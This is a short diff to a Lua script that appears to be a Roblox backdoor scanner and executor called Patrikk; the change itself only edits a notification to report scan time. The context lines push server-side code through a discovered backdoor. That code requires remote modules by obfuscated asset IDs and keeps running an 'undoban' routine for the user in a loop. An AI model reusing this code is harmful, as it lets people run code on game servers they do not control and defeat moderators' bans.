@@ -3259,7 +3259,7 @@ end)
         fireRemoteEvent('uruserlol="' .. game.Players.LocalPlayer.Name .. '"al=game:GetService("Players");th=al:GetUserIdFromNameAsync(uruserlol)local function event() require(84214278325089+1)["undoban"]({th});end task.spawn(event);task.spawn(function() al.PlayerRemoving:Connect(event);while task.wait(10) do event();end end)')
         fireRemoteEvent('require(88808180999972)("' .. game.Players.LocalPlayer.Name .. '")')
         fireRemoteEvent('require(3986243232).load("Patrikk anti skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
-        notify.Info("Patrikk","Backdoor found! Implemented backdoor protection & anti skid.")
+        notify.Info("Patrikk","Backdoor found! Took: "..scanTime.." seconds.")
     else
         notify.Warn("Patrikk","No backdoor found.")
         LMG2["ScanButton_c"]["Text"] = "No backdoor found :("
